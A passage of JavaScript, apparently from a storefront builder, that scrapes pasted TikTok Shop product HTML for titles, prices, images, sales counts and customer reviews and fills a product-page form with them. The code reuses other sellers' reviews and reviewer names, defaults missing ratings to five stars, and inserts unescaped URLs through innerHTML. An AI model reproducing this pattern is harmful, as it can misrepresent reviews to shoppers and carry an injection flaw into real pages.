    }
    
    // Tambem buscar em src (para imagens ja carregadas)
    const srcRegex = /src="(https?:\/\/p[^"]+\.(?:webp|jpg|jpeg|png|gif)[^"]*)"/gi;
    while ((match = srcRegex.exec(decodedHtml)) !== null) {
      const url = match[1];
      if (url && !foundUrls.has(url)) {
        foundUrls.add(url);
        const type = classifyImage(url);
        if (type === 'product' && !productImages.includes(url)) productImages.push(url);
        else if (type === 'avatar' && !avatarImages.includes(url)) avatarImages.push(url);
        else if (type === 'review' && !reviewClientImages.includes(url)) reviewClientImages.push(url);
      }
    }
    
    // ============================================
    // EXTRACAO DE IMAGENS DE DESCRICAO (NAO-QUADRADAS)
    // ============================================
    // Imagens de descricao do TikTok tem formato diferente (ex: 800:454, 800:600)
    // enquanto imagens de produto sao 800:800 e reviews sao 300:300
    const descImageRegex = /(?:src|data-src)="(https?:\/\/p16-oec-sg\.ibyteimg\.com\/[^"]+)"/gi;
    const descriptionImagesFromHtml = [];
    let descImgMatch;
    
    while ((descImgMatch = descImageRegex.exec(decodedHtml)) !== null) {
      const url = descImgMatch[1];
      if (url && !descriptionImagesFromHtml.includes(url)) {
        // Filtrar: pegar imagens de descricao (nao 800:800 que sao de produto, nem 100:100/300:300 que sao de review/avatar)
        if (!url.includes('800:800') && 
            !url.includes('cropcenter:100:100') && 
            !url.includes('crop-webp:300:300')) {
          // Verificar se parece ser imagem de descricao (ratio diferente de 1:1)
          const sizeMatch = url.match(/(\d{3,4}):(\d{3,4})/);
          if (sizeMatch) {
            const w = parseInt(sizeMatch[1]);
            const h = parseInt(sizeMatch[2]);
            // Se nao for quadrada (diferenca > 50px), provavelmente e descricao
            if (Math.abs(w - h) > 50) {
              descriptionImagesFromHtml.push(url);
            }
          }
        }
      }
    }
    
    // Usar imagens extraidas do HTML se nao tiver do JSON
    if (jsonDescImages.length === 0 && descriptionImagesFromHtml.length > 0) {
      jsonDescImages = descriptionImagesFromHtml;
    }
    
    // ============================================
    // EXTRACAO DE DESCRICAO FORMATADA
    // ============================================
    let description = jsonProductDesc || '';
    
    // Se nao tem descricao do JSON, extrair do HTML com formatacao
    if (!description) {
      // METODO 1: Buscar especificamente a secao "Descricao do produto" do TikTok
      // O TikTok usa a classe "sectionContent-ays9DZ" para o conteudo da descricao
      // e "text-ivhDIx" para cada linha de texto
      
      // Primeiro tentar encontrar a secao pela estrutura do TikTok
      const sectionHeaders = doc.querySelectorAll('[class*="sectionTitle"], [class*="title"]');
      let descriptionSection = null;
      
      sectionHeaders.forEach(header => {
        const headerText = header.textContent.toLowerCase();
        if (headerText.includes('descri') || headerText.includes('detail') || headerText.includes('sobre')) {
          // Encontrar o proximo irmao que contem o conteudo
          let sibling = header.nextElementSibling;
          while (sibling && !sibling.querySelector('[class*="text-"]')) {
            sibling = sibling.nextElementSibling;
          }
          if (sibling) descriptionSection = sibling;
        }
      });
      
      // Buscar textos da secao de descricao ou de todo o documento
      const textEls = descriptionSection 
        ? descriptionSection.querySelectorAll('[class*="text-ivhDIx"], [class*="text-"], div')
        : doc.querySelectorAll('[class*="text-ivhDIx"], [class*="textnomargin"]');
      
      const descTexts = [];
      const seenTexts = new Set();
      
      textEls.forEach(el => {
        const t = el.textContent.trim();
        // Filtrar textos validos
        if (t && t.length > 3 && !seenTexts.has(t) &&
            !t.match(/^R\$/) && 
            !t.match(/^\d{1,2}\/\d{1,2}$/) &&
            !t.match(/^(Entrega|Devolução|dias|vendido|Avaliaç|Review|Recomen|Compr|Ver mais)/i) &&
            !t.includes('TikTok') &&
            !t.includes('http') &&
            !t.includes('Visitar') &&
            !t.match(/^\d+\s*$/) && // Nao pegar numeros sozinhos
            !t.match(/^[\d.,]+\s*(mil|k)?$/i)) { // Nao pegar contagens
          seenTexts.add(t);
          descTexts.push(t);
        }
      });
      
      // Juntar textos com formatacao HTML bonita
      if (descTexts.length > 0) {
        description = formatDescriptionHtml(descTexts);
      }
    }
    
    // METODO 2: Regex para extrair textos da secao sectionContent diretamente do HTML
    if (!description || description.length < 50) {
      const sectionContentRegex = /<div[^>]*class="[^"]*sectionContent[^"]*"[^>]*>([\s\S]*?)<\/div>\s*<\/div>/gi;
      let sectionMatch;
      const extractedTexts = [];
      
      while ((sectionMatch = sectionContentRegex.exec(decodedHtml)) !== null) {
        const sectionHtml = sectionMatch[1];
        // Extrair textos das divs dentro
        const textDivRegex = /<div[^>]*class="[^"]*text-[^"]*"[^>]*>([^<]+)<\/div>/gi;
        let textMatch;
        while ((textMatch = textDivRegex.exec(sectionHtml)) !== null) {
          const txt = textMatch[1].trim();
          if (txt.length > 5 && !extractedTexts.includes(txt)) {
            extractedTexts.push(txt);
          }
        }
      }
      
      if (extractedTexts.length > 0 && extractedTexts.join('\n').length > (description?.length || 0)) {
        description = formatDescriptionHtml(extractedTexts);
      }
    }
    
    // Fallback: seletores tradicionais
    if (!description) {
      const descSelectors = [
        '[class*="sectionContent"]',
        '[data-e2e="product-desc"]', 
        '[class*="ProductDescription"]',
        '[class*="product-description"]',
        '[class*="Description"]', 
        '[class*="description"]', 
        '[class*="detail"]',
        '[class*="ProductDetail"]'
      ];
      for (const sel of descSelectors) {
        const el = doc.querySelector(sel);
        if (el && el.textContent.trim().length > 20) {
          // Tentar preservar quebras de linha
          const innerHtml = el.innerHTML;
          const rawDescription = innerHtml
            .replace(/<br\s*\/?>/gi, '\n')
            .replace(/<\/div>\s*<div/gi, '\n<div')
            .replace(/<[^>]+>/g, '')
            .replace(/\n{3,}/g, '\n\n')
            .trim();
          // Formatar o texto extraido
          const lines = rawDescription.split('\n').filter(l => l.trim());
          description = formatDescriptionHtml(lines);
          break;
        }
      }
    }
    
    // Extrair rating (formato: 4.7 /5 ou 4,7)
    let rating = '';
    const ratingMatch = fullText.match(/(\d[.,]\d)\s*(?:\/\s*5|estrelas?|stars?|\s+\()/i);
    if (ratingMatch) rating = ratingMatch[1].replace(',', '.');
    
    // Extrair vendas
    let salesCount = '';
    const salesMatch = fullText.match(/(\d+(?:[.,]\d+)?)\s*(?:mil\s+)?(?:vendidos?|sold)/i);
    if (salesMatch) {
      salesCount = salesMatch[1].replace(/[.,]/g, '');
      if (salesMatch[0].toLowerCase().includes('mil')) {
        salesCount = String(Math.round(parseFloat(salesMatch[1].replace(',', '.')) * 1000));
      }
    }
    
    // Extrair loja
    let storeName = '';
    let storeLogo = '';
    const storeSelectors = ['[data-e2e="shop-name"]', '[class*="ShopName"]', '[class*="shop-name"]', '[class*="SellerName"]', '[class*="seller-name"]'];
    for (const sel of storeSelectors) {
      const el = doc.querySelector(sel);
      if (el && el.textContent.trim().length > 2 && el.textContent.trim().length < 50) {
        storeName = el.textContent.trim();
        break;
      }
    }
    
    // Buscar logo da loja
    const logoSelectors = ['[data-e2e="shop-logo"] img', '[class*="ShopLogo"] img', '[class*="shop-logo"] img', '[class*="SellerAvatar"] img'];
    for (const sel of logoSelectors) {
      const el = doc.querySelector(sel);
      if (el) {
        storeLogo = el.src || el.getAttribute('data-src') || '';
        if (storeLogo) break;
      }
    }
    
    // Extrair avaliacoes do TikTok
    // Estrutura real do HTML do TikTok:
    // - Nome: no atributo alt das imagens de review: "from V**a A**a"
    // - Texto: div antes da imagem de review
    // - Variante: "Item<!-- -->:</div>Caramelo, 38"
    // - Avatar: data-src com cropcenter:100:100
    // - Imagem review: data-src com crop-webp:300:300
    const reviews = [];
    
    // 1) Extrair nomes dos usuarios a partir do alt das imagens de review
    const userNames = [];
    const altNameRegex = /alt="Product Review[^"]*from ([^"]+)"/gi;
    let nameMatch;
    while ((nameMatch = altNameRegex.exec(decodedHtml)) !== null) {
      // Limpar o nome: remover numeros no final (ex: "L**a M**l 1" -> "L**a M**l")
      let name = nameMatch[1].trim().replace(/\s*\d+$/, '');
      if (name && !userNames.includes(name)) {
        userNames.push(name);
      }
    }
    
    // 2) Extrair detalhes de variante "Item: Caramelo, 38"
    const detailsList = [];
    // Padrao TikTok: <div>Item<!-- -->:</div>Caramelo, 38
    const detailsRegex = /Item(?:<!-- -->)?:\s*(?:<\/div>)?([^<\n]{2,60})/gi;
    let detailMatch;
    while ((detailMatch = detailsRegex.exec(decodedHtml)) !== null) {
      const detail = detailMatch[1].trim().replace(/^<\/div>/, '').trim();
      if (detail && detail.length > 1 && detail.length < 80) {
        detailsList.push('Item: ' + detail);
      }
    }
    
    // 3) Extrair textos de review
    // METODO PRINCIPAL: Buscar divs com classe "H4-Regular text-color-UIText1"
    // Esta e a classe que o TikTok usa para o texto das avaliacoes
    const reviewTexts = [];
    
    // Regex para extrair texto da classe H4-Regular text-color-UIText1 flex-1
    const h4ReviewRegex = /<div[^>]*class="[^"]*H4-Regular[^"]*text-color-UIText1[^"]*"[^>]*>([^<]+)<\/div>/gi;
    let h4Match;
    while ((h4Match = h4ReviewRegex.exec(decodedHtml)) !== null && reviewTexts.length < 5) {
      const txt = h4Match[1].trim();
      if (txt && txt.length > 10 && !reviewTexts.includes(txt)) {
        // Verificar se e um texto de review (nao um texto de interface)
        const rejectPatterns = ['{', 'http', 'function', 'display:', 'Entrega', 'Devolução', 'TikTok', 'R$'];
        let shouldReject = false;
        for (const pattern of rejectPatterns) {
          if (txt.includes(pattern)) { shouldReject = true; break; }
        }
        if (!shouldReject) {
          reviewTexts.push(txt);
        }
      }
    }
    
    // FALLBACK 1: Buscar pelo DOM se o metodo regex nao encontrou
    if (reviewTexts.length === 0) {
      const h4Els = doc.querySelectorAll('[class*="H4-Regular"][class*="text-color-UIText1"]');
      h4Els.forEach(el => {
        const txt = el.textContent.trim();
        if (txt && txt.length > 10 && !reviewTexts.includes(txt) && reviewTexts.length < 5) {
          if (!txt.includes('{') && !txt.includes('http') && !txt.includes('Entrega')) {
            reviewTexts.push(txt);
          }
        }
      });
    }
    
    // FALLBACK 2: Dividir o HTML pelos blocos de review usando "Item<!-- -->:" como separador
    if (reviewTexts.length === 0) {
      const reviewBlockSplitRegex = /Item(?:<!-- -->)?:/gi;
      const reviewBlocks = decodedHtml.split(reviewBlockSplitRegex);
      
      for (let i = 1; i < reviewBlocks.length && reviewTexts.length < 5; i++) {
        const prevBlock = reviewBlocks[i - 1];
        const textBeforeImg = prevBlock.match(/>([^<]{15,300})<\/div>[^<]*$/);
        if (textBeforeImg) {
          const txt = textBeforeImg[1].trim();
          const rejectPatterns = [
            '{', 'http', 'function', 'display:', 'className',
            'Entrega', 'entrega', 'Devolução', 'devolução', 'dias',
            'ecom_shop', 'retailer', 'policy', 'seller', 'approved',
            'Mar ', 'Abr ', 'Mai ', 'Jun ', 'Jul ', 'Ago ', 'Set ', 'Out ', 'Nov ', 'Dez ', 'Jan ', 'Fev ',
            'Vendido por', 'vendido por', 'Políticas', 'políticas',
            'frete', 'Frete', 'grátis', 'Grátis', 'envio', 'Envio'
          ];
          let shouldReject = false;
          for (const pattern of rejectPatterns) {
            if (txt.includes(pattern)) { shouldReject = true; break; }
          }
          if (!shouldReject && txt && /^[a-zA-ZÀ-ÿ]/.test(txt)) {
            const alphaRatio = (txt.match(/[a-zA-ZÀ-ÿ\s.,!?'"áéíóúâêîôûãõàèìòùç]/g) || []).length / txt.length;
            if (alphaRatio > 0.70) {
              reviewTexts.push(txt);
            }
          }
        }
      }
    }
    
    // FALLBACK 3: buscar textos pelo padrao simples se nao encontrou nada
    if (reviewTexts.length === 0) {
      const seenTexts = new Set();
      const fallbackTextRegex = />([^<]{20,300})<\/div>/g;
      let ftMatch;
      while ((ftMatch = fallbackTextRegex.exec(decodedHtml)) !== null) {
        const txt = ftMatch[1].trim();
        if (!txt || seenTexts.has(txt)) continue;
        if (txt.includes('{') || txt.includes('}') || txt.includes('http') ||
            txt.includes('://') || txt.includes('function') || txt.includes('=>') ||
            txt.includes('px') || txt.includes('rem') || txt.includes('display:') ||
            txt.includes('Item:') || txt.includes('Item<!--') || txt.includes('R$') ||
            txt.includes('TikTok') || txt.includes('2026-') || txt.includes('2025-') ||
            txt.includes('2024-') || txt.includes('className') ||
            txt.includes('Entrega') || txt.includes('entrega') ||
            txt.includes('Devolução') || txt.includes('devolução') ||
            txt.includes('ecom_shop') || txt.includes('retailer') || txt.includes('policy') ||
            txt.includes('seller') || txt.includes('approved') || txt.includes('dias') ||
            txt.includes('Mar ') || txt.includes('Abr ') || txt.includes('Mai ') ||
            txt.includes('Vendido por') || txt.includes('vendido por') ||
            txt.includes('Políticas') || txt.includes('políticas') ||
            txt.includes('frete') || txt.includes('Frete') || txt.includes('grátis') ||
            txt.includes('envio') || txt.includes('Envio')) continue;
        if (!/^[a-zA-ZÀ-ÿ]/.test(txt)) continue;
        const alphaRatio = (txt.match(/[a-zA-ZÀ-ÿ\s.,!?'"áéíóúâêîôûãõàèìòùç]/g) || []).length / txt.length;
        if (alphaRatio > 0.80) {
          seenTexts.add(txt);
          reviewTexts.push(txt);
        }
      }
    }
    
    // Contar estrelas por review (5 estrelas = 5x star-solid)
    const starCounts = [];
    const starBlockRegex = /(<div[^>]*>(?:(?!<\/div>).)*star-solid(?:(?!<\/div>).)*<\/div>)/gi;
    let starBlock;
    while ((starBlock = starBlockRegex.exec(decodedHtml)) !== null) {
      const solidCount = (starBlock[1].match(/star-solid/g) || []).length;
      if (solidCount > 0 && solidCount <= 5) {
        starCounts.push(solidCount);
      }
    }
    
    // Criar reviews — max 3
    // Usar userNames como referencia principal (extraidos do alt das imagens)
    const numReviews = Math.min(
      Math.max(userNames.length, avatarImages.length, reviewClientImages.length),
      3
    );
    for (let i = 0; i < numReviews; i++) {
      reviews.push({
        author: userNames[i] || 'Cliente ' + (i + 1),
        avatar: avatarImages[i] || '',
        details: detailsList[i] || '',
        rating: starCounts[i] || 5,
        text: reviewTexts[i] || '',
        images: reviewClientImages[i] ? [reviewClientImages[i]] : []
      });
    }
    
    // Preencher campos do formulario
    if (title) {
      const titleEl = document.getElementById('product-title');
      if (titleEl) titleEl.value = title;
    }
    if (currentPrice) {
      const priceEl = document.getElementById('current-price');
      if (priceEl) priceEl.value = currentPrice;
    }
    if (originalPrice) {
      const origPriceEl = document.getElementById('original-price');
      if (origPriceEl) origPriceEl.value = originalPrice;
    }
    if (rating) {
      const ratingEl = document.getElementById('product-rating');
      if (ratingEl) ratingEl.value = rating;
    }
    if (salesCount) {
      const salesEl = document.getElementById('sales-count');
      if (salesEl) salesEl.value = salesCount;
    }
    if (storeName) {
      const storeEl = document.getElementById('store-name');
      if (storeEl) storeEl.value = storeName;
    }
    if (storeLogo) {
      const logoEl = document.getElementById('store-logo-url');
      if (logoEl) logoEl.value = storeLogo;
    }
    if (description) {
      const descEl = document.getElementById('product-description');
      if (descEl) descEl.value = description;
    }
    
    // Imagens da descricao (do JSON ou fallback vazio)
    if (jsonDescImages.length > 0) {
      const descImgEl = document.getElementById('description-images');
      if (descImgEl) descImgEl.value = jsonDescImages.join(', ');
    }
    
    // Imagem principal - ID correto e 'main-image'
    if (productImages.length > 0) {
      const mainImgEl = document.getElementById('main-image');
      if (mainImgEl) mainImgEl.value = productImages[0];
    }
    
    // Imagens adicionais - ID correto e 'additional-images' (campo de texto com virgulas)
    if (productImages.length > 1) {
      const additionalEl = document.getElementById('additional-images');
      if (additionalEl) {
        additionalEl.value = productImages.slice(1).join(', ');
      }
    }
    
    // Adicionar avaliacoes usando a funcao addReview() do sistema
    // Primeiro limpar avaliacoes existentes
    const reviewItemsContainer = document.getElementById('review-items');
    if (reviewItemsContainer) {
      reviewItemsContainer.innerHTML = '';
    }
    
    // Adicionar as reviews extraidas
    if (reviews.length > 0 && typeof addReview === 'function') {
      reviews.forEach((rev, idx) => {
        const reviewData = {
          name: rev.author || 'Cliente ' + (idx + 1),
          avatarUrl: rev.avatar || '',
          details: rev.details || 'Item: Padrao',
          stars: rev.rating || 5,
          text: rev.text || '',
          image: rev.images && rev.images.length > 0 ? rev.images[0] : '',
          images: rev.images && rev.images.length > 0 ? rev.images : []
        };
        const reviewItem = addReview(reviewData);
        // Adicionar listeners de atualizacao automatica
        if (reviewItem && typeof setupLiveUpdateListeners === 'function') {
          setupLiveUpdateListeners(reviewItem);
        }
      });
    }
    
    // Extrair e adicionar variantes (cores)
    // Prioridade 1: usar dados do JSON __MODERN_ROUTER_DATA__
    // Prioridade 2: buscar nomes de cores conhecidas no HTML
    const variantNames = [];
    const variantImages = [];
    
    if (jsonVariants.length > 0) {
      // Dados vem do JSON - sao as cores exatas do produto com suas imagens
      jsonVariants.slice(0, 3).forEach((v) => {
        variantNames.push(v.name);
        variantImages.push(v.imageUrl || '');
      });
    } else {
      // Fallback simples: buscar cores na ordem que aparecem e usar imagens 800x800 de produto
      const knownColors = ['Off-white', 'Off-White', 'Caramelo', 'Preto', 'Branco', 'Rosa', 'Vermelho', 'Azul', 'Verde', 'Amarelo', 'Laranja', 'Roxo', 'Marrom', 'Bege', 'Nude', 'Dourado', 'Prata', 'Cinza'];
      
      // Encontrar a ordem das cores pelo indice de aparicao no HTML
      const colorPositions = [];
      knownColors.forEach(color => {
        const pos = decodedHtml.indexOf(color);
        if (pos !== -1) {
          colorPositions.push({ name: color, position: pos });
        }
      });
      
      // Ordenar pela posicao de aparicao e pegar as primeiras 3 cores unicas
      colorPositions.sort((a, b) => a.position - b.position);
      
      const seenColors = new Set();
      colorPositions.slice(0, 6).forEach((cp, idx) => {
        if (!seenColors.has(cp.name) && variantNames.length < 3) {
          seenColors.add(cp.name);
          variantNames.push(cp.name);
          // Usar a imagem de produto correspondente ao indice
          if (productImages[variantNames.length - 1]) {
            variantImages.push(productImages[variantNames.length - 1]);
          }
        }
      });
    }
    
    // Debug: verificar o que foi extraido
    console.log('[v0] productImages:', productImages.length, productImages.slice(0, 2));
    console.log('[v0] variantNames:', variantNames);
    console.log('[v0] variantImages:', variantImages.length, variantImages);
    
    // Adicionar variantes ao formulario
    if (variantImages.length > 0 && typeof addColor === 'function') {
      // Limpar variantes existentes
      const colorContainer = document.getElementById('color-options');
      if (colorContainer) {
        colorContainer.innerHTML = '';
      }
      
      // Adicionar cada variante (APENAS as cores, nao os tamanhos)
      for (let i = 0; i < variantImages.length; i++) {
        const colorData = {
          imageUrl: variantImages[i] || '',
          name: variantNames[i] || 'Cor ' + (i + 1),
          price: currentPrice || '',
          checkoutUrl: ''
        };
        const colorItem = addColor(colorData);
        if (colorItem && typeof setupLiveUpdateListeners === 'function') {
          setupLiveUpdateListeners(colorItem);
        }
      }
    }
    
    // Resumo
    const found = [];
    if (title) found.push('titulo');
    if (currentPrice) found.push('preco');
    if (productImages.length > 0) found.push(productImages.length + ' img produto');
    if (variantImages.length > 0) found.push(variantImages.length + ' cores');
    if (description) found.push('descricao' + (jsonProductDesc ? ' (JSON)' : ' (HTML)'));
    if (jsonDescImages.length > 0) found.push(jsonDescImages.length + ' img desc');
    if (rating) found.push('nota');
    if (salesCount) found.push('vendas');
    if (storeName) found.push('loja');
    if (reviews.length > 0) found.push(reviews.length + ' avaliacoes');
    
    if (found.length > 0) {
      if (status) status.innerText = 'Extraido: ' + found.join(', ');
      status.style.color = '#22c55e';
    } else {
      if (status) status.innerText = 'Nenhum dado encontrado. Verifique se copiou o HTML corretamente.';
      status.style.color = '#ef4444';
    }
    
    if (typeof updateOutput === 'function') updateOutput();
    
  } catch (e) {
    if (status) {
      status.innerText = 'Erro ao processar HTML: ' + e.message;
      status.style.color = '#ef4444';
    }
  }
}

// --- FUNCAO IMPORTAR IMAGENS DO TIKTOK ---
function importTikTokImages() {
  const input = document.getElementById('tiktok-images-input');
  const status = document.getElementById('tiktok-images-status');
  
  if (!input || !input.value.trim()) {
    alert('Cole as URLs das imagens no campo de texto.');
    return;
  }
  
  const urls = input.value.trim().split('\n').map(url => url.trim()).filter(url => url.startsWith('http'));
  
  if (urls.length === 0) {
    alert('Nenhuma URL valida encontrada. Certifique-se de copiar o endereco completo da imagem.');
    return;
  }
  
  // Primeira imagem vai para o campo principal
  const mainImageInput = document.getElementById('main-image-url');
  if (mainImageInput && urls[0]) {
    mainImageInput.value = urls[0];
  }
  
  // Imagens adicionais
  const container = document.getElementById('additional-images-container');
  if (container && urls.length > 1) {
    for (let i = 1; i < urls.length; i++) {
      const div = document.createElement('div');
      div.className = 'option-item';
      div.innerHTML = '<input type="text" class="additional-image-url" value="' + urls[i] + '" placeholder="URL da imagem adicional"><button class="remove-option-btn" onclick="removeOption(this)">X</button>';
      container.appendChild(div);
    }
  }
  
  if (status) status.innerText = urls.length + ' imagem(ns) importada(s)!';
  if (typeof updateOutput === 'function') updateOutput();
}

// --- FUNCAO EXTRAIR RECOMENDACOES DO HTML DO TIKTOK ---
function extractRecommendationsFromTikTok() {
  const input = document.getElementById('tiktok-rec-html-input');
  const status = document.getElementById('tiktok-rec-html-status');
  
  if (!input || !input.value.trim()) {
    alert('Cole o HTML da pagina do TikTok Shop no campo de texto.');
    return;
  }
  
  const html = input.value;
  if (status) status.innerText = 'Processando HTML...';
  
  try {
    // Decodificar HTML entities
    const decodedHtml = html
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"');
    
    // Extrair dados de UM produto (igual ao produto principal)
    let title = '';
    let currentPrice = '';
    let originalPrice = '';
    let mainImage = '';
    
    // Criar DOM para parsing
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    
    // Extrair titulo
    const titleSelectors = ['h1', '[data-e2e="product-title"]', '[class*="ProductTitle"]', '[class*="product-title"]', '[class*="title"]'];
    for (const sel of titleSelectors) {
      const el = doc.querySelector(sel);
      if (el && el.textContent.trim().length > 3) {
        title = el.textContent.trim();
        break;
      }
    }
    
    // Extrair precos
    const priceRegex = /R\$\s*([\d,.]+)/g;
    const prices = [];
    let priceMatch;
    while ((priceMatch = priceRegex.exec(decodedHtml)) !== null) {
      prices.push(priceMatch[1]);
    }
    if (prices.length > 0) currentPrice = prices[0];
    if (prices.length > 1) originalPrice = prices[1];
    
    // Extrair imagem principal (800:800)
    const imgRegex = /data-src="([^"]+resize-webp:800:800[^"]*)"/gi;
    let imgMatch = imgRegex.exec(decodedHtml);
    if (imgMatch) {
      mainImage = imgMatch[1];
    } else {
      // Tentar src normal
      const srcRegex = /src="(https?:\/\/p[^"]+\.(?:webp|jpg|jpeg|png)[^"]*)"/gi;
      imgMatch = srcRegex.exec(decodedHtml);
      if (imgMatch) mainImage = imgMatch[1];
    }
    
    // Verificar se extraiu dados minimos
    if (!title && !mainImage) {
      if (status) {
        status.innerText = 'Nao foi possivel extrair dados do produto. Verifique se copiou o HTML corretamente.';
        status.style.color = '#ef4444';
      }
      return;
    }
    
    // Criar recomendacao com os dados extraidos
    const rec = {
      productTitle: title || 'Produto Recomendado',
      currentPrice: currentPrice || '',
      originalPrice: originalPrice || '',
      mainImage: mainImage || '',
      productUrl: 'rec-' + Date.now()
    };
    
    // Adicionar recomendacao
    if (typeof addRecommendation === 'function') {
      addRecommendation(rec);
    }
    
    if (status) {
      status.innerText = 'Produto "' + (title || 'Recomendado').substring(0, 30) + '..." adicionado!';
      status.style.color = '#22c55e';
    }
    
    // Limpar campo para proximo produto
    input.value = '';
    
    if (typeof updateOutput === 'function') updateOutput();
    
  } catch (e) {
    if (status) {
      status.innerText = 'Erro ao processar HTML: ' + e.message;
      status.style.color = '#ef4444';
    }
  }
}

// --- FUNÇÕES AUXILIARES ---
const el = (id) => document.getElementById(id);
const val = (id) => el(id) ? el(id).value : "";
const removeOption = (btn) => {
  btn.parentElement.remove();
  updateOutputDebounced();
};

// ============================================================================
// ===================== SISTEMA DE TRADUÇÃO (DICIONÁRIO) =====================
// ============================================================================

const TRANSLATIONS = {
    pt: {
        search_placeholder: "Pesquisar",
        nav_home: "Visão geral", nav_products: "Produtos", nav_categories: "Categorias",
        filters: ["Recomendado", "Mais vendidos", "Lançamentos"],
        discount_off: "OFF",
        free_shipping: "Frete grátis",
        interest_free: "sem juros",
        sold_count: "vendido(s)",
        btn_buy: "Comprar<br>com cupom",
        btn_buy2: "Comprar com cupom",
        btn_add_cart: "Adicionar<br>ao carrinho",
        shipping_title: "Receba até",
        shipping_fee: "Taxa de envio",
        returns_policy: "Devoluções gratuitas em 30 dias • Cancelamento fácil",
        select_options: "Selecione opções",
        reviews_title: "Avaliações",
        reviews_title2: "Avaliações dos Clientes",
        view_more: "Ver mais",
        description_title: "Descrição",
        recommendations_title: "Recomendações",
        recommendations_title2: "Você também pode gostar",
        footer_institutional: "Institucional", footer_help: "Atendimento", footer_about: "Sobre nós",
        footer_links: ["Política de Privacidade", "Trocas e Devoluções", "Política de Envio", "Termos de Uso"],
        flash_deal: "Oferta Relámpago",
        ends_in: "Termina em",
        visit_store: "Visitar",
        footer_icon_store: "Loja",
        footer_icon_chat: "Chat",
        label_email: "Email:",
        label_whatsapp: "WhatsApp:",
        label_address: "Endereço:",
        label_cnpj: "CNPJ:",
        label_business_name: "Razão Social:",
        footer_rights: "Todos os direitos reservados",
        label_qty: "Quantidade" // ADICIONADO AQUI
    },
    "pt-pt": {
        search_placeholder: "O que procuras?",
        nav_home: "Página Inicial", nav_products: "Produtos", nav_categories: "Categorias",
        filters: ["Relevância", "Mais vendidos", "Novidades"],
        discount_off: "DESC",
        free_shipping: "Portes grátis",
        interest_free: "sem juros",
        sold_count: "vendido(s)",
        btn_buy: "Comprar<br>agora",
        btn_buy2: "Comprar agora",
        btn_add_cart: "Adicionar<br>ao carrinho",
        shipping_title: "Entrega em",
        shipping_fee: "Portes",
        returns_policy: "Trocas e devoluções gratuitas até 30 dias",
        select_options: "Selecionar opções",
        reviews_title: "Opiniões",
        reviews_title2: "Opiniões de Clientes",
        view_more: "Ver mais",
        description_title: "Ficha do Produto",
        recommendations_title: "Produtos relacionados",
        recommendations_title2: "Também pode gostar",
        footer_institutional: "Institucional", footer_help: "Apoio ao Cliente", footer_about: "Sobre nós",
        footer_links: ["Política de Privacidade", "Trocas e Devoluções", "Política de Envio", "Termos de Utilização"],
        flash_deal: "Promoção",
        ends_in: "Termina em",
        visit_store: "Visitar loja",
        footer_icon_store: "Loja",
        footer_icon_chat: "Ajuda",
        label_email: "Email:",
        label_whatsapp: "Telefone:",
        label_address: "Morada:",
        label_cnpj: "NIF:",
        label_business_name: "Denominação Social:",
        footer_rights: "Todos os direitos reservados",
        label_qty: "Quantidade"
    },
    en: {
        search_placeholder: "Search",
        nav_home: "Home", nav_products: "Products", nav_categories: "Categories",
        filters: ["Recommended", "Best Sellers", "New Arrivals"],
        discount_off: "OFF",
        free_shipping: "Free Shipping",
        interest_free: "interest-free",
        sold_count: "sold",
        btn_buy: "Buy Now",
        btn_buy2: "Buy with coupon",
        btn_add_cart: "Add to Cart",
        shipping_title: "Arriving by",
        shipping_fee: "Shipping fee",
        returns_policy: "Free 30-day returns • Easy cancellation",
        select_options: "Select options",
        reviews_title: "Reviews",
        reviews_title2: "Customer Reviews",
        view_more: "View more",
        description_title: "Details",
        recommendations_title: "Recommendations",
        recommendations_title2: "You May Also Like",
        footer_institutional: "Company", footer_help: "Support", footer_about: "About Us",
        footer_links: ["Privacy Policy", "Returns", "Shipping Policy", "Terms of Use"],
        flash_deal: "Flash Deal",
        ends_in: "Ends in",
        visit_store: "Visit Store",
        footer_icon_store: "Store",
        footer_icon_chat: "Chat",
        label_email: "Email:",
        label_whatsapp: "WhatsApp:",
        label_address: "Address:",
        label_cnpj: "Tax ID:",
        label_business_name: "Company:",
        footer_rights: "All rights reserved",
        label_qty: "Quantity" // NOVA CHAVE
    },
    es: {
        search_placeholder: "Buscar",
        nav_home: "Inicio", nav_products: "Productos", nav_categories: "Categorías",
        filters: ["Recomendado", "Más vendidos", "Nuevos"],
        discount_off: "OFF",
        free_shipping: "Envío Gratis",
        interest_free: "sin intereses",
        sold_count: "vendido(s)",
        btn_buy: "Comprar Ahora",
        btn_buy2: "Comprar con cupón",
        btn_add_cart: "Añadir al carrito",
        shipping_title: "Llega pronto",
        shipping_fee: "Envío",
        returns_policy: "Devoluciones gratis 30 días • Cancelación fácil",
        select_options: "Opciones",
        reviews_title: "Opiniones",
        reviews_title2: "Opiniones de Clientes",
        view_more: "Ver más",
        description_title: "Detalles",
        recommendations_title: "Recomendaciones",
        recommendations_title2: "También te gusta",
        footer_institutional: "Institucional", footer_help: "Ayuda", footer_about: "Nosotros",
        footer_links: ["Privacidad", "Devoluciones", "Envío", "Términos de Uso"],
        flash_deal: "Oferta Flash",
        ends_in: "Termina en",
        visit_store: "Visitar",
        footer_icon_store: "Tienda",
        footer_icon_chat: "Chat",
        label_email: "Correo:",
        label_whatsapp: "WhatsApp:",
        label_address: "Dirección:",
        label_cnpj: "ID Fiscal:",
        label_business_name: "Empresa:",
        footer_rights: "Todos los derechos reservados",
        label_qty: "Cantidad" // NOVA CHAVE
    },
    fr: {
        search_placeholder: "Rechercher",
        nav_home: "Accueil", nav_products: "Produits", nav_categories: "Catégories",
        filters: ["Recommandé", "Meilleures ventes", "Nouveaut��s"],
        discount_off: "PROMO",
        free_shipping: "Livraison gratuite",
        interest_free: "sans intérêts",
        sold_count: "vendu(s)",
        btn_buy: "Acheter<br>avec coupon",
        btn_buy2: "Acheter avec coupon",
        btn_add_cart: "Ajouter au<br>panier",
        shipping_title: "Livraison prévue",
        shipping_fee: "Frais de livraison",
        returns_policy: "Retours gratuits sous 30 jours • Annulation facile",
        select_options: "Sélectionner les options",
        reviews_title: "Avis",
        reviews_title2: "Avis des clients",
        view_more: "Voir plus",
        description_title: "Description",
        recommendations_title: "Recommandations",
        recommendations_title2: "Vous aimerez aussi",
        footer_institutional: "Entreprise", footer_help: "Service client", footer_about: "À propos",
        footer_links: ["Politique de confidentialité", "Échanges et retours", "Politique d'expédition", "Conditions d'utilisation"],
        flash_deal: "Vente Flash",
        ends_in: "Se termine dans",
